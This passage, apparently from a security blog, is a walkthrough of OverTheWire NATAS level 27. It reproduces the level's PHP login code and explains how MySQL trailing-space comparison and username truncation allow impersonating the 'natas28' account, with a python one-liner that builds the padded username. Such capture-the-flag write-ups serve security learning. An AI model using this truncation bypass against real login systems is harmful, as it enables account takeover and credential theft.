  <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
  
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * from users where username='</span><span class="nv">$user</span><span class="s2">'"</span><span class="p">;</span>
  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
        <span class="c1">// thanks to Gobo for reporting this bug! </span>
        <span class="c1">//return print_r($row);</span>
        <span class="k">return</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">function</span> <span class="n">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">){</span>

  <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
  <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
  
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"INSERT INTO users (username,password) values ('</span><span class="nv">$user</span><span class="s2">','</span><span class="nv">$password</span><span class="s2">')"</span><span class="p">;</span>
  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_affected_rows</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">return</span> <span class="kc">True</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"password"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'natas27'</span><span class="p">,</span> <span class="s1">'&lt;censored&gt;'</span><span class="p">);</span>
  <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'natas27'</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  

  <span class="k">if</span><span class="p">(</span><span class="nf">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">//user exists, check creds</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">])){</span>
      <span class="k">echo</span> <span class="s2">"Welcome "</span> <span class="mf">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"!&lt;br&gt;"</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">"Here is your data:&lt;br&gt;"</span><span class="p">;</span>
      <span class="nv">$data</span><span class="o">=</span> <span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]);</span>
      <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"Wrong password for user: "</span> <span class="mf">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>    
  <span class="p">}</span> 
  <span class="k">else</span> <span class="p">{</span>
    <span class="c1">//user doesn't exist</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">])){</span> 
      <span class="k">echo</span> <span class="s2">"User "</span> <span class="mf">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">" was created!"</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
Username: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;</span>
Password: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">type=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"login"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span></code></pre></figure><p>This level has another username/password form request to break. It first checks to see if there are any users with the username provided, and if there is, it validates the credentials. Otherwise, it creates a user with the credentials provided. After a successful login, the credentials are printed out from an array:</p><p><img class="alignnone size-full wp-image-302" data-src="/assets/img/2019/09/2019-09-20_09h19_05.png" data-proofer-ignore></p><p>I thought this would end up being a SQL injection challenge since there are so many SQL queries in the source, but after a little experimentation and closer inspection of the code it became apparent that is not. All of the user inputs for the SQL queries are sanitized with mysql_real_escape_string(). Also, XSS is blocked by all of the outputs being sanitized by htmlentities(). This code seems pretty secure and I went down several rabbit-holes trying to figure out where the weakness is. Even studied getting around mysql_real_escape_string() with encoding errors, but that doesn’t apply here. It is kind of obvious the challenge is supposed to be solved by tricking the dumpData() function into dumping “natas28”.</p><p>Eventually I had to cheat (I know, I know it’s crappy). The solution I found is really quite clever and I feel dumb for not seeing it and in the future I’ll remember that feeling when considering to cheat or not.</p><p>Turns out there are a couple of weaknesses that when exploited together can bypass the login.</p><p>Firstly, dumpData() has a ‘while’ statement that allows dumping of multiple users if they are in the SQL result. Under normal operations that wouldn’t happen.</p><p>Secondly, MySQL doesn’t count trailing spaces when doing a comparison.</p><p>Thirdly, we can send a username to createUser() that is longer than the 64 bytes given to the ‘username’ field and it will be truncated, but accepted.</p><p>Putting that together, we can get createUser() to create one with a username of natas28 with a bunch of spaces appended to it, so it will pass the validUser() comparison. The last character can’t be a space because we need the first validUser() check to fail, so it will create our exploit user. The length of the username has to be greater than 64 bytes, so the last character (that isn’t a space) will be truncated and the end result in the database will seem to be “natas28” to the comparisons. Then login with “natas28” and the password sent to createUser().</p><p>Here is an example:</p><p>Create the username with <code class="language-plaintext highlighter-rouge">python -c “print(‘natas28’ + ‘+’*57 + ‘1’)”</code> and login.<br /> <img class="alignnone wp-image-304 size-full" data-src="/assets/img/2019/09/2019-09-23_12h48_08.png" data-proofer-ignore></p><p>And the login:</p><p><img class="alignnone wp-image-330 size-full" data-src="/assets/img/2019/09/2019-09-26_12h48_18.png" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/overthewire/'>OverTheWire</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OverTheWire: NATAS 26 &amp;#8211; 27 - MegaWattSec&amp;url=https://megawattsec.com/posts/overthewire-natas-26/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OverTheWire: NATAS 26 &amp;#8211; 27 - MegaWattSec&amp;u=https://megawattsec.com/posts/overthewire-natas-26/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/overthewire-natas-26/&amp;text=OverTheWire: NATAS 26 &amp;#8211; 27 - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/overthewire-natas-16/"><div class="card-body"> <em class="timeago small" data-ts="1568402533" > 2019-09-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 16 &#8211; 20</h3><div class="text-muted small"><p> LEVEL 16 This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source: &amp;lt;form&amp;gt; Find words containing: &amp;lt;input ...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-21/"><div class="card-body"> <em class="timeago small" data-ts="1568659795" > 2019-09-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 21 &#8211; 25</h3><div class="text-muted small"><p> LEVEL 21 This level has a second site associated with it, where all the action is: Main Site PHP sourcecode of the main page: &amp;lt;? function print_credentials() { if($_SESSION and array...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-28/"><div class="card-body"> <em class="timeago small" data-ts="1569506683" > 2019-09-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 28</h3><div class="text-muted small"><p> LEVEL 28 No sourcecode, this will be fun. The program takes your query and searches it against a list of jokes, possibly in a database (since it says “whack computer joke database”). Checking o...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/overthewire-natas-21/" class="btn btn-outline-primary" prompt="Older"><p>OverTheWire: NATAS 21 &#8211; 25</p></a> <a href="/posts/overthewire-natas-28/" class="btn btn-outline-primary" prompt="Newer"><p>OverTheWire: NATAS 28</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
